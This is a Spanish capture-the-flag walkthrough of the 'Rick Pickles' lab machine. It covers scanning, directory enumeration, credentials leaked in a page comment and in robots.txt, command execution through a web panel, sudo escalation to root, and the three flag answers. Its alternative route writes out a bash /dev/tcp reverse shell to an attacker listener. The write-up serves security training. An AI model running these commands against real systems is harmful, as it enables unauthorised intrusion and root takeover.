
# Rick Pickles

## 1. Reconocimiento

#: El objetivo inicial es identificar la superficie de ataque de la máquina.

#: Comenzamos realizando un escaneo con Nmap:
        nmap -sC -sV <IP>

#:El escaneo nos permite identificar los siguientes puertos abiertos:

- Puerto: 22, 80
- Servicios : http y ssh
- Descripción: ssh (secure shell), http(hypertext transfer protocol)

#:Al encontrar el puerto 80/tcp abierto, podemos acceder al servidor web desde el navegador utilizando:

- http://IP/

#: Al revisar la página web, encontramos una imagen y decidimos inspeccionar el código fuente.

#: Dentro del código fuente encontramos un comentario que revela el siguiente usuario:

- R1ckRul3s

## 2. Escaneo y enumeración

#: Ahora vamos a realizar una enumeración más profunda del servidor web.

#: Utilizamos Gobuster para descubrir directorios y archivos:

  gobuster dir -u http://IP -w /usr/share/wordlists/dirb/common.txt -x php,txt,js,py

Parámetros utilizados
- u: especifica la URL objetivo.
- w: especifica el diccionario utilizado para realizar la enumeración.
- x: especifica extensiones de archivos que también queremos buscar.

#:Durante el escaneo encontramos varios recursos interesantes:

- /assets/
- login.php
- robots.txt

#: Accedemos a:
  http://IP/login.php

#: Encontramos un formulario de autenticación que solicita:

- Username:
- Password:

#: Ya conocemos el usuario: 
- R1ckRul3s

#: También accedemos a: http://IP/robots.txt

#: Encontramos la siguiente información: 

- Wubbalubbadubdub

#: Probamos este valor como contraseña junto con el usuario encontrado anteriormente.

#: Las credenciales funcionan y conseguimos acceder al panel.

## 3. Análisis de vulnerabilidades

#: Después de autenticarnos, la URL cambia a: http://IP/portal.php

#: En esta página encontramos un Command Panel que permite introducir comandos.

#: Esto representa un punto crítico, ya que la aplicación web aparentemente permite ejecutar comandos directamente sobre el sistema.

#: Por ejemplo, podemos utilizar pwd para conocer el directorio actual

#: También podemos utilizar ls para listar el contenido donde nos encontramos

#: Durante esta enumeración encontramos:
- Sup3rS3cretPickl3Ingred.txt
- clue.txt

## 4. Explotación: 

#: El Command Panel nos permite ejecutar comandos en el sistema.

#: Primero utilizamos el comando pwd para conocer nuestra ruta actual

#: Despues colocamos el comando ls para listar el contenido de la carpeta actual

#: Encontramos el archivo:
- Sup3rS3cretPickl3Ingred.txt

#: Intentamos visualizarlo utilizando diferentes comandos.

#: cat y more no funcionan correctamente en este entorno, por lo que utilizamos:
- less Sup3rS3cretPickl3Ingred.txt

#: Obtenemos: mr meeseek hair

#: Esta corresponde a la primera flag.


#: También encontramos el archivo clue.txt

#: Lo visualizamos mediante:
- less clue.txt

#: El archivo contiene una pista que indica que debemos buscar otros ingredientes dentro del sistema de archivos.

## 5. Post-explotación

#: Después de conseguir ejecución de comandos, comenzamos a enumerar el sistema.

#: Utilizamos el comando ls / para listar los directorios principales del sistema de archivos.

#: Entre ellos encontramos:
- home  
- root

#: Enumeración de /home utilizamos el comando ls /home/
#: Encontramos dos usuarios:
- rick
- ubuntu

#: Continuamos con la enumeración del directorio del usuario rick:
- ls /home/rick/

#: Encontramos un archivo llamado: second ingredients

#: Como el nombre contiene un espacio, debemos utilizar comillas: 
- less /home/rick/"second ingredients"

#: El contenido es: i jerry tear

#: Esta corresponde a la segunda flag.

## 6. Escalada de privilegios

#: Para encontrar la última flag debemos acceder al directorio: /root

#: Sin embargo, nuestro usuario actual no tiene permisos suficientes para acceder directamente.

#: Primero comprobamos qué permisos tenemos mediante: sudo -l

#:El resultado nos indica que podemos ejecutar comandos utilizando sudo con privilegios administrativos.

#: Esto nos permite ejecutar: sudo ls /root/

#: Encontramos: 3rd.txt

#: Ahora podemos visualizarlo utilizando: sudo less /root/3rd.txt

#: Obtenemos: fleeb juice

#: Esta corresponde a la tercera flag.

## Escalada mediante una shell

#: También podemos conseguir una shell interactiva y posteriormente realizar la escalada.

#: Primero identificamos nuestra dirección IP: ip addr

#: En nuestra máquina de ataque iniciamos un listener: nc -lvnp 4444

#: Desde el Command Panel podemos ejecutar una reverse shell:
  -comando: bash -c 'exec bash -i &>/dev/tcp/ip/4444 <&1'

#:Debemos reemplazar IP por la dirección IP de nuestra máquina de ataque.

#: Una vez recibida la conexión, comprobamos el usuario actual:whoami

#: Obtenemos: www-data

#: Ahora comprobamos los permisos de sudo: sudo -l


#: Podemos observar que el usuario tiene permisos para ejecutar comandos con privilegios administrativos.

#: Ejecutamos: sudo bash

#: Finalmente comprobamos nuestra identidad con el comando: whoami

#: El resultado es:root

#: Hemos conseguido una shell con privilegios de root.

## 7. Conclusiones

Durante la resolución de esta máquina utilizamos diferentes técnicas de reconocimiento, enumeración, explotación y escalada de privilegios.

Resumen de las técnicas utilizadas: 
- Enumeración de puertos con Nmap.
- Enumeración web.
- Descubrimiento de archivos y directorios con Gobuster.
- Análisis del código fuente.
- Enumeración de robots.txt.
- Obtención de credenciales.
- Ejecución de comandos mediante el Command Panel.
- Enumeración del sistema de archivos.
- Obtención de las flags.
-  Enumeración de permisos mediante sudo -l.
-  Escalada de privilegios hasta root.
- Uso de una reverse shell como método alternativo de acceso.

## Flags: 
- Primera flag:mr meeseek hair

- Segunda flag:i jerry tear

- Tercera flag:fleeb juice

## Lecciones aprendidas: 

1.- Esta máquina permitió practicar el proceso completo de un pentest, desde el reconocimiento inicial 
    hasta la escalada de privilegios.

2.- Uno de los puntos más importantes fue entender que información aparentemente poco relevante, como un
    comentario en el código fuente o el contenido de robots.txt, puede proporcionar información útil para continuar 
    con la enumeración.

3.- También aprendimos la importancia de revisar los permisos de sudo mediante: sudo -l ya que una configuración 
    incorrecta puede permitir que un usuario con pocos privilegios ejecute comandos como root.

## Herramientas utilizadas
- Nmap
-  Gobuster
-  Netcat
-  Navegador web
-  Linux terminal


